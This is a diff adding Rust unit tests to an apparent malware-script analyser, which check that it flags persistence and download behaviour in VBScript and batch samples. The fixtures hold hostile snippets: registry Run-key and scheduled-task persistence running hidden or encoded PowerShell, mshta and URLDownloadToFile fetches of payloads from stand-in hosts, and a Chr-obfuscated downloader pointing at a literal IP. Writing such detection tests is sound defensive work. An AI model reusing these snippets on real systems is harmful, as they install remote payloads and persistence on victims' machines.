+        assert!(
+            report.extracted_vbs.len() >= 2,
+            "ActiveScriptEventConsumer script text should be surfaced as VBS"
+        );
+    }
+
+    #[test]
+    fn standalone_vbs_wmi_scheduledjob_create_emits_persistence() {
+        let vbs = br#"Set wmi = GetObject("winmgmts:\\.\root\cimv2")
+Set job = wmi.Get("Win32_ScheduledJob")
+job.Create "cmd.exe /c powershell.exe -NoP -Command Write-Host scheduled", "********123000.000000-000", True, 1, 0, False, 0"#;
+
+        let report = analyze(vbs, &Config::default());
+
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::Persistence {
+                    hive,
+                    key,
+                    value_name,
+                    command,
+                } if hive == "ScheduledTask"
+                    && key == "Win32_ScheduledJob"
+                    && value_name == "Create"
+                    && command == "cmd.exe /c powershell.exe -NoP -Command Write-Host scheduled"
+            )),
+            "no ScheduledTask Persistence from VBS Win32_ScheduledJob.Create: {:?}",
+            report.traits
+        );
+        assert!(
+            !report.extracted_ps1.is_empty(),
+            "scheduled job command should be recursively routed through powershell"
+        );
+    }
+
+    #[test]
+    fn standalone_vbs_task_scheduler_action_emits_persistence() {
+        let vbs = br#"Set svc = CreateObject("Schedule.Service")
+svc.Connect
+Set rootFolder = svc.GetFolder("\")
+Set taskDef = svc.NewTask(0)
+Set action = taskDef.Actions.Create(0)
+action.Path = "powershell.exe"
+action.Arguments = "-WindowStyle Hidden -Command IEX('payload')"
+rootFolder.RegisterTaskDefinition "Updater", taskDef, 6, "", "", 3"#;
+
+        let report = analyze(vbs, &Config::default());
+
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::Persistence {
+                    hive,
+                    key,
+                    value_name,
+                    command,
+                } if hive == "ScheduledTask"
+                    && key == "Updater"
+                    && value_name == "RegisterTaskDefinition"
+                    && command == "powershell.exe -WindowStyle Hidden -Command IEX('payload')"
+            )),
+            "no ScheduledTask Persistence from VBS Schedule.Service action: {:?}",
+            report.traits
+        );
+        assert!(
+            !report.extracted_ps1.is_empty(),
+            "task scheduler action should be routed through powershell"
+        );
+    }
+
+    #[test]
+    fn standalone_vbs_task_scheduler_xml_emits_persistence() {
+        let vbs = br#"Set svc = CreateObject("Schedule.Service")
+svc.Connect
+Set rootFolder = svc.GetFolder("\")
+xml = "<Task><Actions><Exec><Command>powershell.exe</Command><Arguments>-NoP -EncodedCommand VwByAGkAdABlAC0ASABvAHMAdAAgAHgAbQBsAHQAYQBzAGsA</Arguments></Exec></Actions></Task>"
+rootFolder.RegisterTaskDefinition "XmlUpdater", xml, 6, "", "", 3"#;
+
+        let report = analyze(vbs, &Config::default());
+
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::Persistence {
+                    hive,
+                    key,
+                    command,
+                    ..
+                } if hive == "ScheduledTask"
+                    && key == "XmlUpdater"
+                    && command == "powershell.exe -NoP -EncodedCommand VwByAGkAdABlAC0ASABvAHMAdAAgAHgAbQBsAHQAYQBzAGsA"
+            )),
+            "no ScheduledTask Persistence from VBS RegisterTaskDefinition XML: {:?}",
+            report.traits
+        );
+        assert!(
+            !report.extracted_ps1.is_empty(),
+            "task scheduler XML command should be routed through powershell"
+        );
+    }
+
+    #[test]
+    fn standalone_vbs_regwrite_run_key_emits_persistence() {
+        let vbs = br#"Set sh = CreateObject("WScript.Shell")
+cmd = "powershell.exe -EncodedCommand VwByAGkAdABlAC0ASABvAHMAdAAgAGYAcgBvAG0ALQByAHUAbgBrAGUAeQA="
+sh.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\Updater", cmd, "REG_SZ""#;
+
+        let report = analyze(vbs, &Config::default());
+
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::Persistence {
+                    hive,
+                    key,
+                    value_name,
+                    command,
+                } if hive == "HKCU"
+                    && key == r"Software\Microsoft\Windows\CurrentVersion\Run"
+                    && value_name == "Updater"
+                    && command == "powershell.exe -EncodedCommand VwByAGkAdABlAC0ASABvAHMAdAAgAGYAcgBvAG0ALQByAHUAbgBrAGUAeQA="
+            )),
+            "no Run-key Persistence from VBS RegWrite: {:?}",
+            report.traits
+        );
+        assert!(
+            !report.extracted_ps1.is_empty(),
+            "RegWrite Run value should be routed through powershell"
+        );
+    }
+
+    #[test]
+    fn standalone_vbs_stdregprov_setstringvalue_run_key_emits_persistence() {
+        let vbs = br#"Set reg = GetObject("winmgmts:\\.\root\default:StdRegProv")
+HKCU = &H80000001
+key = "Software\Microsoft\Windows\CurrentVersion\Run"
+name = "Updater"
+cmd = "powershell.exe -EncodedCommand VwByAGkAdABlAC0ASABvAHMAdAAgAHMAdABkAHIAZQBnAA=="
+reg.SetStringValue HKCU, key, name, cmd"#;
+
+        let report = analyze(vbs, &Config::default());
+
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::Persistence {
+                    hive,
+                    key,
+                    value_name,
+                    command,
+                } if hive == "HKCU"
+                    && key == r"Software\Microsoft\Windows\CurrentVersion\Run"
+                    && value_name == "Updater"
+                    && command == "powershell.exe -EncodedCommand VwByAGkAdABlAC0ASABvAHMAdAAgAHMAdABkAHIAZQBnAA=="
+            )),
+            "no Run-key Persistence from VBS StdRegProv.SetStringValue: {:?}",
+            report.traits
+        );
+        assert!(
+            !report.extracted_ps1.is_empty(),
+            "StdRegProv Run value should be routed through powershell"
+        );
+    }
+
+    #[test]
+    fn standalone_vbs_stdregprov_setstringvalue_hklm_runonce_emits_persistence() {
+        let vbs = br#"Set reg = GetObject("winmgmts:\\.\root\default:StdRegProv")
+reg.SetStringValue &H80000002, "Software\Microsoft\Windows\CurrentVersion\RunOnce", "OneShot", "mshta https://stdregprov-runonce.example/payload.hta""#;
+
+        let report = analyze(vbs, &Config::default());
+
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::Persistence {
+                    hive,
+                    key,
+                    value_name,
+                    command,
+                } if hive == "HKLM"
+                    && key == r"Software\Microsoft\Windows\CurrentVersion\RunOnce"
+                    && value_name == "OneShot"
+                    && command == "mshta https://stdregprov-runonce.example/payload.hta"
+            )),
+            "no HKLM RunOnce Persistence from VBS StdRegProv.SetStringValue: {:?}",
+            report.traits
+        );
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::Download { src, .. }
+                    if src == "https://stdregprov-runonce.example/payload.hta"
+            )),
+            "StdRegProv RunOnce command should be scanned for URL launches: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn standalone_vbs_stdregprov_setexpandedstringvalue_run_key_emits_persistence() {
+        let vbs = br#"Set reg = GetObject("winmgmts:\\.\root\default:StdRegProv")
+reg.SetExpandedStringValue &H80000001, "Software\Microsoft\Windows\CurrentVersion\Run", "Expanded", "powershell.exe -EncodedCommand VwByAGkAdABlAC0ASABvAHMAdAAgAGUAeABwAGEAbgBkAGUAZAA=""#;
+
+        let report = analyze(vbs, &Config::default());
+
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::Persistence {
+                    hive,
+                    key,
+                    value_name,
+                    command,
+                } if hive == "HKCU"
+                    && key == r"Software\Microsoft\Windows\CurrentVersion\Run"
+                    && value_name == "Expanded"
+                    && command == "powershell.exe -EncodedCommand VwByAGkAdABlAC0ASABvAHMAdAAgAGUAeABwAGEAbgBkAGUAZAA="
+            )),
+            "no Run-key Persistence from VBS StdRegProv.SetExpandedStringValue: {:?}",
+            report.traits
+        );
+        assert!(
+            !report.extracted_ps1.is_empty(),
+            "StdRegProv SetExpandedStringValue Run value should be routed through powershell"
+        );
+    }
+
+    #[test]
+    fn standalone_vbs_stdregprov_setstringvalue_non_run_key_is_not_persistence() {
+        let vbs = br#"Set reg = GetObject("winmgmts:\\.\root\default:StdRegProv")
+reg.SetStringValue &H80000001, "Software\Demo", "Value", "mshta https://stdregprov-nonrun.example/payload.hta""#;
+
+        let report = analyze(vbs, &Config::default());
+
+        assert!(
+            !report.traits.iter().any(|t| matches!(
+                t,
+                Trait::Persistence {
+                    command,
+                    ..
+                } if command == "mshta https://stdregprov-nonrun.example/payload.hta"
+            )),
+            "non-Run StdRegProv write should not emit Persistence: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn standalone_vbs_scriptcontrol_eval_literal_body_is_scanned() {
+        let body = r#"CreateObject("WScript.Shell").Run("mshta https://scriptcontrol-eval.example/payload.hta")"#;
+        let vbs = br#"Set sc = CreateObject("MSScriptControl.ScriptControl")
+sc.Language = "VBScript"
+sc.Eval "CreateObject(""WScript.Shell"").Run(""mshta https://scriptcontrol-eval.example/payload.hta"")""#;
+
+        let report = analyze(vbs, &Config::default());
+
+        assert!(
+            report
+                .extracted_vbs
+                .iter()
+                .any(|payload| String::from_utf8_lossy(payload) == body),
+            "ScriptControl Eval body was not exposed as child VBS: {:?}",
+            report.extracted_vbs
+        );
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::Download { src, .. }
+                    if src == "https://scriptcontrol-eval.example/payload.hta"
+            )),
+            "ScriptControl Eval body was not scanned: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn standalone_vbs_scriptcontrol_executestatement_literal_body_is_scanned() {
+        let body = r#"CreateObject("WScript.Shell").Run "mshta https://scriptcontrol-execstmt.example/payload.hta", 0, False"#;
+        let vbs = br#"Set sc = CreateObject("MSScriptControl.ScriptControl")
+sc.Language = "VBScript"
+sc.ExecuteStatement "CreateObject(""WScript.Shell"").Run ""mshta https://scriptcontrol-execstmt.example/payload.hta"", 0, False""#;
+
+        let report = analyze(vbs, &Config::default());
+
+        assert!(
+            report
+                .extracted_vbs
+                .iter()
+                .any(|payload| String::from_utf8_lossy(payload) == body),
+            "ScriptControl ExecuteStatement body was not exposed as child VBS: {:?}",
+            report.extracted_vbs
+        );
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::Download { src, .. }
+                    if src == "https://scriptcontrol-execstmt.example/payload.hta"
+            )),
+            "ScriptControl ExecuteStatement body was not scanned: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn standalone_vbs_scriptcontrol_addcode_run_body_is_scanned() {
+        let body = r#"Sub Main(): CreateObject("WScript.Shell").Run "powershell.exe -EncodedCommand VwByAGkAdABlAC0ASABvAHMAdAAgAHMAYwByAGkAcAB0AGMAbwBuAHQAcgBvAGwA", 0, False: End Sub"#;
+        let vbs = br#"Set sc = CreateObject("MSScriptControl.ScriptControl")
+sc.Language = "VBScript"
+sc.AddCode "Sub Main(): CreateObject(""WScript.Shell"").Run ""powershell.exe -EncodedCommand VwByAGkAdABlAC0ASABvAHMAdAAgAHMAYwByAGkAcAB0AGMAbwBuAHQAcgBvAGwA"", 0, False: End Sub"
+sc.Run "Main""#;
+
+        let report = analyze(vbs, &Config::default());
+
+        assert!(
+            report
+                .extracted_vbs
+                .iter()
+                .any(|payload| String::from_utf8_lossy(payload) == body),
+            "ScriptControl AddCode body was not exposed as child VBS: {:?}",
+            report.extracted_vbs
+        );
+        assert!(
+            !report.extracted_ps1.is_empty(),
+            "ScriptControl AddCode Run body should be routed through powershell"
+        );
+    }
+
+    #[test]
+    fn standalone_vbs_shortcut_creation_emits_shortcut_trait() {
+        let vbs = br#"Set shell = CreateObject("WScript.Shell")
+Set link = shell.CreateShortcut("C:\Users\Public\Desktop\demo.lnk")
+link.TargetPath = "C:\Windows\System32\cmd.exe"
+link.Arguments = "/c calc.exe"
+link.WorkingDirectory = "C:\Users\Public"
+link.Save"#;
+
+        let report = analyze(vbs, &Config::default());
+        let traits = serde_json::to_value(&report.traits).expect("traits serialize");
+        let traits = traits.as_array().expect("traits array");
+
+        assert!(
+            traits.iter().any(|trait_json| {
+                trait_json.get("kind").and_then(|value| value.as_str()) == Some("ShortcutCreated")
+                    && trait_json.get("path").and_then(|value| value.as_str())
+                        == Some(r"C:\Users\Public\Desktop\demo.lnk")
+                    && trait_json.get("target").and_then(|value| value.as_str())
+                        == Some(r"C:\Windows\System32\cmd.exe")
+                    && trait_json.get("arguments").and_then(|value| value.as_str())
+                        == Some("/c calc.exe")
+                    && trait_json
+                        .get("working_directory")
+                        .and_then(|value| value.as_str())
+                        == Some(r"C:\Users\Public")
+            }),
+            "no ShortcutCreated trait from VBS CreateShortcut/Save: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn standalone_vbs_shortcut_without_save_does_not_emit_shortcut_trait() {
+        let vbs = br#"Set shell = CreateObject("WScript.Shell")
+Set link = shell.CreateShortcut("demo.lnk")
+link.TargetPath = "cmd.exe""#;
+
+        let report = analyze(vbs, &Config::default());
+
+        assert!(
+            !report
+                .traits
+                .iter()
+                .any(|t| matches!(t, Trait::ShortcutCreated { .. })),
+            "unsaved shortcut should not emit ShortcutCreated: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn standalone_office_vbs_startuppath_saveas_is_preserved_as_vbs() {
+        let vbs = br#"If ActiveWorkbook.Modules.Count > 0 Then
+  Workbooks("Book1").SaveAs Application.StartupPath & "/PERSONAL.XLS"
+End If"#;
+
+        let report = analyze(vbs, &Config::default());
+
+        assert_eq!(
+            report.extracted_vbs.len(),
+            1,
+            "Office VBS source was not queued as VBS: {:?}",
+            report.extracted_vbs
+        );
+        assert!(
+            report
+                .deobfuscated
+                .contains(r#"Workbooks("Book1").SaveAs Application.StartupPath & "/PERSONAL.XLS""#),
+            "Office VBS SaveAs line was split as batch: {:?}",
+            report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn vbs_wscript_shell_run_self_accumulated_chr_command_url_extracted() {
+        let mut env = Environment::new(&Config::default());
+        let vbs = br#"Dim pdf, GG
+pdf = pdf + Chr(99)
+pdf = pdf + Chr(109)
+pdf = pdf + Chr(100)
+pdf = pdf + Chr(32)
+pdf = pdf + Chr(47)
+pdf = pdf + Chr(99)
+pdf = pdf + Chr(32)
+pdf = pdf + Chr(112)
+pdf = pdf + Chr(111)
+pdf = pdf + Chr(119)
+pdf = pdf + Chr(101)
+pdf = pdf + Chr(114)
+pdf = pdf + Chr(115)
+pdf = pdf + Chr(104)
+pdf = pdf + Chr(101)
+pdf = pdf + Chr(108)
+pdf = pdf + Chr(108)
+pdf = pdf + Chr(32)
+pdf = pdf + Chr(73)
+pdf = pdf + Chr(110)
+pdf = pdf + Chr(118)
+pdf = pdf + Chr(111)
+pdf = pdf + Chr(107)
+pdf = pdf + Chr(101)
+pdf = pdf + Chr(45)
+pdf = pdf + Chr(87)
+pdf = pdf + Chr(101)
+pdf = pdf + Chr(98)
+pdf = pdf + Chr(82)
+pdf = pdf + Chr(101)
+pdf = pdf + Chr(113)
+pdf = pdf + Chr(117)
+pdf = pdf + Chr(101)
+pdf = pdf + Chr(115)
+pdf = pdf + Chr(116)
+pdf = pdf + Chr(32)
+pdf = pdf + Chr(45)
+pdf = pdf + Chr(85)
+pdf = pdf + Chr(114)
+pdf = pdf + Chr(105)
+pdf = pdf + Chr(32)
+pdf = pdf + Chr(116)
+pdf = pdf + Chr(116)
+pdf = pdf + Chr(112)
+pdf = pdf + Chr(58)
+pdf = pdf + Chr(47)
+pdf = pdf + Chr(47)
+pdf = pdf + Chr(52)
+pdf = pdf + Chr(53)
+pdf = pdf + Chr(46)
+pdf = pdf + Chr(56)
+pdf = pdf + Chr(56)
+pdf = pdf + Chr(46)
+pdf = pdf + Chr(54)
+pdf = pdf + Chr(55)
+pdf = pdf + Chr(46)
+pdf = pdf + Chr(55)
+pdf = pdf + Chr(53)
+pdf = pdf + Chr(47)
+pdf = pdf + Chr(112)
+pdf = pdf + Chr(100)
+pdf = pdf + Chr(102)
+pdf = pdf + Chr(47)
+pdf = pdf + Chr(97)
+pdf = pdf + Chr(46)
+pdf = pdf + Chr(112)
+pdf = pdf + Chr(100)
+pdf = pdf + Chr(102)
+GG = "%Temp%" + "\google.vbs"
+CreateObject("WScript.Shell").Run pdf + GG, 0, True"#;
+        env.all_extracted_vbs.push(vbs.to_vec());
+        crate::vbs_scan::scan_vbs_payloads(&mut env);
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "http://45.88.67.75/pdf/a.pdf"
+            )
+        });
+        assert!(
+            has,
+            "no Download trait from VBS self-accumulated Chr command: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn standalone_vbs_shell_run_chr_concat_url_extracted() {
+        let vbs = br#"Dim cmd
+cmd = "mshta " & Chr(104) & "ttp://standalone-vbs-run.example/payload.hta"
+Set sh = CreateObject("WScript.Shell")
+sh.Run cmd, 0, False"#;
+        let report = analyze(vbs, &Config::default());
+        let has = report.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. }
+                    if src == "http://standalone-vbs-run.example/payload.hta"
+            )
+        });
+        assert!(
+            has,
+            "no Download trait from standalone VBS WScript.Shell.Run Chr concat URL: {:?}",
+            report.traits
+        );
+        assert!(
+            report.deobfuscated.contains(
+                r#"cmd = "mshta " & Chr(104) & "ttp://standalone-vbs-run.example/payload.hta""#
+            ),
+            "standalone VBS source was not preserved in deobfuscated output: {:?}",
+            report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn batch_wsf_vbscript_accumulated_chr_command_url_extracted() {
+        let script = br#"<!-- : batch portion
+@echo off
+cscript /nologo "%~f0?.wsf"
+goto :EOF
+: VBScript -->
+<job>
+<script language="VBScript">
+Dim pdf, GG
+pdf = pdf + Chr(99)
+pdf = pdf + Chr(109)
+pdf = pdf + Chr(100)
+pdf = pdf + Chr(32)
+pdf = pdf + Chr(47)
+pdf = pdf + Chr(99)
+pdf = pdf + Chr(32)
+pdf = pdf + Chr(112)
+pdf = pdf + Chr(111)
+pdf = pdf + Chr(119)
+pdf = pdf + Chr(101)
+pdf = pdf + Chr(114)
+pdf = pdf + Chr(115)
+pdf = pdf + Chr(104)
+pdf = pdf + Chr(101)
+pdf = pdf + Chr(108)
+pdf = pdf + Chr(108)
+pdf = pdf + Chr(32)
+pdf = pdf + Chr(73)
+pdf = pdf + Chr(110)
+pdf = pdf + Chr(118)
+pdf = pdf + Chr(111)
+pdf = pdf + Chr(107)
+pdf = pdf + Chr(101)
+pdf = pdf + Chr(45)
+pdf = pdf + Chr(87)
+pdf = pdf + Chr(101)
+pdf = pdf + Chr(98)
+pdf = pdf + Chr(82)
+pdf = pdf + Chr(101)
+pdf = pdf + Chr(113)
+pdf = pdf + Chr(117)
+pdf = pdf + Chr(101)
+pdf = pdf + Chr(115)
+pdf = pdf + Chr(116)
+pdf = pdf + Chr(32)
+pdf = pdf + Chr(45)
+pdf = pdf + Chr(85)
+pdf = pdf + Chr(114)
+pdf = pdf + Chr(105)
+pdf = pdf + Chr(32)
+pdf = pdf + Chr(116)
+pdf = pdf + Chr(116)
+pdf = pdf + Chr(112)
+pdf = pdf + Chr(58)
+pdf = pdf + Chr(47)
+pdf = pdf + Chr(47)
+pdf = pdf + Chr(52)
+pdf = pdf + Chr(53)
+pdf = pdf + Chr(46)
+pdf = pdf + Chr(56)
+pdf = pdf + Chr(56)
+pdf = pdf + Chr(46)
+pdf = pdf + Chr(54)
+pdf = pdf + Chr(55)
+pdf = pdf + Chr(46)
+pdf = pdf + Chr(55)
+pdf = pdf + Chr(53)
+pdf = pdf + Chr(47)
+pdf = pdf + Chr(112)
+pdf = pdf + Chr(100)
+pdf = pdf + Chr(102)
+pdf = pdf + Chr(47)
+pdf = pdf + Chr(97)
+pdf = pdf + Chr(46)
+pdf = pdf + Chr(112)
+pdf = pdf + Chr(100)
+pdf = pdf + Chr(102)
+GG = "%Temp%" + "\google.vbs"
+CreateObject("WScript.Shell").Run pdf + GG, 0, True
+</script>
+</job>"#;
+        let report = analyze(script, &Config::default());
+        let has = report.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "http://45.88.67.75/pdf/a.pdf"
+            )
+        });
+        assert!(
+            has,
+            "no Download trait from batch WSF embedded VBS Chr accumulator: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn standalone_vbs_on_error_prefix_shell_run_url_extracted() {
+        let vbs = br#"On Error Resume Next
+Dim cmd
+cmd = "mshta http://standalone-vbs-onerror.example/payload.hta"
+Set sh = CreateObject("WScript.Shell")
+sh.Run cmd, 0, False"#;
+        let report = analyze(vbs, &Config::default());
+        let has = report.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. }
+                    if src == "http://standalone-vbs-onerror.example/payload.hta"
+            )
+        });
+        assert!(
+            has,
+            "no Download trait from standalone VBS with On Error prefix: {:?}",
+            report.traits
+        );
+        assert!(
+            report
+                .deobfuscated
+                .contains("On Error Resume Next\nDim cmd"),
+            "standalone VBS source was not preserved in deobfuscated output: {:?}",
+            report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn standalone_vbs_sub_prefix_shell_run_url_extracted() {
+        let vbs = br#"Sub Main()
+Set sh = CreateObject("WScript.Shell")
+sh.Run "mshta http://standalone-vbs-sub.example/payload.hta", 0, False
+End Sub
+Main"#;
+        let report = analyze(vbs, &Config::default());
+        let has = report.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. }
+                    if src == "http://standalone-vbs-sub.example/payload.hta"
+            )
+        });
+        assert!(
+            has,
+            "no Download trait from standalone VBS with Sub prefix: {:?}",
+            report.traits
+        );
+        assert!(
+            report.deobfuscated.contains("Sub Main()\nSet sh"),
+            "standalone VBS source was not preserved in deobfuscated output: {:?}",
+            report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn standalone_vbs_public_sub_prefix_shell_run_url_extracted() {
+        let vbs = br#"Public Sub Main()
+Set sh = CreateObject("WScript.Shell")
+sh.Run "mshta http://standalone-vbs-public-sub.example/payload.hta", 0, False
+End Sub
+Main"#;
+        let report = analyze(vbs, &Config::default());
+        let has = report.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. }
+                    if src == "http://standalone-vbs-public-sub.example/payload.hta"
+            )
+        });
+        assert!(
+            has,
+            "no Download trait from standalone VBS with Public Sub prefix: {:?}",
+            report.traits
+        );
+        assert!(
+            report.deobfuscated.contains("Public Sub Main()\nSet sh"),
+            "standalone VBS source was not preserved in deobfuscated output: {:?}",
+            report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn standalone_vbs_sub_urldownloadtofile_is_scanned() {
+        let vbs = br#"Sub ScriptMain()
+URLDownloadToFile 0, "https://standalone-vbs-urldown-sub.example/payload.bin", "C:\Temp\payload.bin", 0, 0
+End Sub"#;
+        let report = analyze(vbs, &Config::default());
+        let has = report.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, dst, .. }
+                    if src == "https://standalone-vbs-urldown-sub.example/payload.bin"
+                        && dst.as_deref() == Some("C:\\Temp\\payload.bin")
+            )
+        });
+        assert!(
+            has,
+            "no structured Download from standalone Sub URLDownloadToFile: {:?}",
+            report.traits
+        );
+        assert_eq!(
+            report.extracted_vbs.len(),
+            1,
+            "standalone Sub URLDownloadToFile input was not queued as VBS"
+        );
+    }
+
+    #[test]
+    fn standalone_vbs_getobject_script_moniker_is_scanned() {
+        let vbs = br#"GetObject("script:https://standalone-vbs-getobject.example/stage.sct")"#;
+        let report = analyze(vbs, &Config::default());
+        let has = report.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, dst, .. }
+                    if src == "https://standalone-vbs-getobject.example/stage.sct"
+                        && dst.is_none()
+            )
+        });
+        assert!(
+            has,
+            "no structured Download from standalone VBS script moniker: {:?}",
+            report.traits
+        );
+        assert_eq!(
+            report.extracted_vbs.len(),
+            1,
+            "standalone VBS script moniker input was not queued as VBS"
+        );
+    }
+
+    #[test]
+    fn standalone_vbs_compat_url_helpers_are_structured() {
+        let vbs = br#"Sub ScriptMain()
+BinaryGetURL "https://standalone-vbs-compat.example/a.bin"
+FollowHyperlink "https://standalone-vbs-compat.example/b"
+Call Navigate("http://standalone-vbs-compat.example/c")
+End Sub"#;
+        let report = analyze(vbs, &Config::default());
+        assert!(
+            report.traits.iter().any(|t| matches!(t,
+                Trait::Download { src, dst, .. }
+                    if src == "https://standalone-vbs-compat.example/a.bin"
+                        && dst.is_none()
+            )),
+            "BinaryGetURL did not emit structured Download: {:?}",
+            report.traits
+        );
+        for expected in [
+            "https://standalone-vbs-compat.example/b",
+            "http://standalone-vbs-compat.example/c",
+        ] {
+            assert!(
+                report
+                    .traits
+                    .iter()
+                    .any(|t| matches!(t, Trait::UrlLaunch { url, .. } if url == expected)),
+                "VBS URL helper did not emit UrlLaunch for {expected}: {:?}",
+                report.traits
+            );
+        }
+    }
+
+    #[test]
+    fn standalone_vbs_response_redirect_is_url_launch() {
+        let vbs = br#"Response.Redirect "https://standalone-vbs-redirect.example/panel""#;
+        let report = analyze(vbs, &Config::default());
+        assert!(
+            report.traits.iter().any(|t| matches!(t,
+                Trait::UrlLaunch { url, .. }
+                    if url == "https://standalone-vbs-redirect.example/panel"
+            )),
+            "Response.Redirect did not emit UrlLaunch: {:?}",
+            report.traits
+        );
+        assert_eq!(
+            report.extracted_vbs.len(),
+            1,
+            "standalone Response.Redirect input was not queued as VBS/ASP"
+        );
+    }
+
+    #[test]
+    fn standalone_vbs_function_prefix_shell_run_url_extracted() {
+        let vbs = br#"Function Main()
+Set sh = CreateObject("WScript.Shell")
+sh.Run "mshta http://standalone-vbs-function.example/payload.hta", 0, False
+End Function
+Main"#;
+        let report = analyze(vbs, &Config::default());
+        let has = report.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. }
+                    if src == "http://standalone-vbs-function.example/payload.hta"
+            )
+        });
+        assert!(
+            has,
+            "no Download trait from standalone VBS with Function prefix: {:?}",
+            report.traits
+        );
+        assert!(
+            report.deobfuscated.contains("Function Main()\nSet sh"),
+            "standalone VBS source was not preserved in deobfuscated output: {:?}",
+            report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn standalone_vbs_class_prefix_shell_run_url_extracted() {
+        let vbs = br#"Class Runner
+Public Sub Main()
+Set sh = CreateObject("WScript.Shell")
+sh.Run "mshta http://standalone-vbs-class.example/payload.hta", 0, False
+End Sub
+End Class
+Set r = New Runner
+r.Main"#;
+        let report = analyze(vbs, &Config::default());
+        let has = report.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. }
+                    if src == "http://standalone-vbs-class.example/payload.hta"
+            )
+        });
+        assert!(
+            has,
+            "no Download trait from standalone VBS with Class prefix: {:?}",
+            report.traits
+        );
+        assert!(
+            report.deobfuscated.contains("Class Runner\nPublic Sub"),
+            "standalone VBS source was not preserved in deobfuscated output: {:?}",
+            report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn standalone_vbs_const_prefix_xmlhttp_url_extracted() {
+        let vbs = br#"Const u = "https://standalone-vbs-const.example/payload.txt"
+Set http = CreateObject("MSXML2.XMLHTTP")
+http.Open "GET", u, False
+http.Send"#;
+        let report = analyze(vbs, &Config::default());
+        let has = report.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. }
+                    if src == "https://standalone-vbs-const.example/payload.txt"
+            )
+        });
+        assert!(
+            has,
+            "no Download trait from standalone VBS with Const prefix: {:?}",
+            report.traits
+        );
+        assert!(
+            report.deobfuscated.contains(
+                "Const u = \"https://standalone-vbs-const.example/payload.txt\"\nSet http"
+            ),
+            "standalone VBS source was not preserved in deobfuscated output: {:?}",
+            report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn standalone_vbs_execute_excel4_macro_urldownloadtofile_extracted() {
+        let vbs = br#"Dim formula
+formula = "CALL(""urlmon"",""URLDownloadToFileA"",""JJCCBB"",0,""http://excel4.example/payload.exe"",""C:\Temp\payload.exe"",0,0)"
+ExecuteExcel4Macro formula"#;
+
+        let report = analyze(vbs, &Config::default());
+
+        assert!(
+            report
+                .extracted_vbs
+                .iter()
+                .any(|payload| String::from_utf8_lossy(payload)
+                    .contains("ExecuteExcel4Macro formula")),
+            "Excel4Macro VBS source was not queued as VBS: {:?}",
+            report.extracted_vbs
+        );
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::Download { src, dst, .. }
+                    if src == "http://excel4.example/payload.exe"
+                        && dst.as_deref() == Some("C:\\Temp\\payload.exe")
+            )),
+            "Excel4Macro URLDownloadToFile URL was not extracted: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn standalone_vbs_with_createobject_prefix_xmlhttp_url_extracted() {
+        let vbs = br#"With CreateObject("MSXML2.XMLHTTP")
+.Open "GET", "https://standalone-vbs-with.example/payload.txt", False
+.Send
+End With"#;
+        let report = analyze(vbs, &Config::default());
+        let has = report.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. }
+                    if src == "https://standalone-vbs-with.example/payload.txt"
+            )
+        });
+        assert!(
+            has,
+            "no Download trait from standalone VBS with With/CreateObject prefix: {:?}",
+            report.traits
+        );
+        assert!(
+            report
+                .deobfuscated
+                .contains("With CreateObject(\"MSXML2.XMLHTTP\")\n.Open"),
+            "standalone VBS source was not preserved in deobfuscated output: {:?}",
+            report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn standalone_vbs_createobject_run_prefix_url_extracted() {
+        let vbs = br#"CreateObject("WScript.Shell").Run "mshta https://standalone-vbs-direct-createobject.example/payload.hta", 0, False"#;
+        let report = analyze(vbs, &Config::default());
+        let has = report.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. }
+                    if src == "https://standalone-vbs-direct-createobject.example/payload.hta"
+            )
+        });
+        assert!(
+            has,
+            "no Download trait from standalone VBS with direct CreateObject prefix: {:?}",
+            report.traits
+        );
+        assert!(
+            report
+                .deobfuscated
+                .contains("CreateObject(\"WScript.Shell\").Run"),
+            "standalone VBS source was not preserved in deobfuscated output: {:?}",
+            report.deobfuscated
+        );
+    }
+
